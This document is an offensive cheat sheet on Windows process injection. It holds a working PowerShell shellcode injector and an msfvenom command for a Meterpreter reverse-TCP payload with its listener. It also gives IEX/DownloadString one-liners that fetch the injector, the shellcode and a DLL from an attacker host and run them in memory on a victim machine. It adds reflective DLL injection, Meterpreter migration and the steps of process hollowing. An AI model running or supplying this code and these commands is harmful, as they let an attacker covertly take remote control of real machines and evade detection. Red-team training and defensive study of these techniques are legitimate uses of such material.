# Process Injection

## Classic Shellcode Injection (VirtualAllocEx / WriteProcessMemory / CreateRemoteThread)

### 1) Setup the injector

inject.ps1

    function Invoke-Shellcode {
        param(
            [Parameter(Mandatory=$true)][int]$ProcessId,
            [Parameter(Mandatory=$true)][byte[]]$Shellcode
        )
        Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32Inject {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint da, bool inh, int pid);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr lpAddr, uint dwSize, uint flAllocType, uint flProtect);
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr lpBase, byte[] lpBuf, uint nSize, out int lpWritten);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr lpTA, uint dwSize, IntPtr lpSF, IntPtr lpParam, uint dwFlags, IntPtr lpTID);
    }
    "@
        $hProc = [Win32Inject]::OpenProcess(0x1FFFFF, $false, $ProcessId)
        if ($hProc -eq [IntPtr]::Zero) { Write-Error "OpenProcess failed for PID $ProcessId"; return }
        $addr = [Win32Inject]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint32]$Shellcode.Length, 0x3000, 0x40)
        if ($addr -eq [IntPtr]::Zero) { Write-Error "VirtualAllocEx failed"; return }
        $written = 0
        [Win32Inject]::WriteProcessMemory($hProc, $addr, $Shellcode, [uint32]$Shellcode.Length, [ref]$written) | Out-Null
        Write-Host "[*] Injecting shellcode into PID $ProcessId (notepad.exe)..."
        [Win32Inject]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
        Write-Host "[+] Shellcode injection complete."
    }

### 2) Generate Meterpreter shellcode (In real life, you use custom made shellcode or from a heavily modified C2 like Cobalt Strike)

    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f raw | base64 -w0 > ~/shell.b64

### 3) Start Metasploit (or your favorite C2) listener

    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST CONNECTION_IP; set LPORT 4444; run"

### 4) Host inject.ps1 and shell.b64

    python3 -m http.server 8000

### 5) On victim machine, open Notepad.exe (example benign process), then open Powershell as Administrator

Fetch inject.ps1

    IEX(New-Object Net.WebClient).DownloadString('http://CONNECTION_IP:8000/inject.ps1')

Fetch shell.b64

    $sc = (New-Object Net.WebClient).DownloadString('http://CONNECTION_IP:8000/shell.b64')

Convert b64 file

    $bytes = [Convert]::FromBase64String($sc.Trim())

Get Notepad.exe (or any target process) PID

    $pid_target = (Get-Process notepad).Id

Inject the shellcode and enjoy your beacon

    Invoke-Shellcode -ProcessId $pid_target -Shellcode $bytes

## Reflective DLL Injection

Reflective.dll is not on this repo.

### 1) Load the injector function into memory (no file written on disk)

    IEX(New-Object Net.WebClient).DownloadString('http://CONNECTION_IP:8000/injector.ps1')

### 2) Pull the DLL bytes directly into memory as a byte array

    $PEBytes = (New-Object Net.WebClient).DownloadData('http://CONNECTION_IP:8000/ReflectiveDLL.dll')

### 3) Map and execute inside the target process (Example is from Powersploit)

    Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcId (Get-Process explorer).Id

## Meterpreter Migrate

### 1) On a Meterpreter session, list processes

    ps

### 2) Pick a process and migrate

    migrate PID

### 3) Confirm migration

    getpid

## Process Hollowing

The steps are:

1) CreateProcess(..., CREATE_SUSPENDED) starts a legitimate binary like svchost.exe in a suspended state

2) NtUnmapViewOfSection unmaps the legitimate image from the process's virtual memory, hollowing it out

3) VirtualAllocEx allocates space for the malicious PE in the now-empty process

4) WriteProcessMemory writes the malicious PE into the allocated region

5) The thread context is updated to point the instruction pointer at the malicious entry point

6) ResumeThread resumes execution, and the process runs the attacker's code

The NtUnmapViewOfSection call in step 2 is the NT-level function that removes the original image mapping.
